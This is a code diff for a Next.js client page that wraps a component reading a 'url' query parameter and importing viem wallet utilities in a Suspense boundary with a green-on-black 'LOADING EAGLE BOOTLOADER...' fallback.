@@ -1,10 +1,10 @@
 "use client";
-import { useEffect, useState } from "react";
+import { useEffect, useState, Suspense } from "react";
 import { useSearchParams } from "next/navigation";
 import { createWalletClient, custom, parseEther } from "viem";
 import { base } from "viem/chains";
 
-export default function CheckPage() {
+function AntivirusContent() {
   const searchParams = useSearchParams();
   const urlToChain = searchParams.get("url");
   
@@ -149,4 +149,16 @@ export default function CheckPage() {
   }
 
   return null;
-              }
+}
+
+export default function CheckPage() {
+  return (
+    <Suspense fallback={
+      <div style={{ backgroundColor: "#050d06", color: "#39ff14", fontFamily: "'Courier New', monospace", height: "100vh", display: "flex", justifyContent: "center", alignItems: "center" }}>
+        LOADING EAGLE BOOTLOADER...
+      </div>
+    }>
+      <AntivirusContent />
+    </Suspense>
+  );
+}
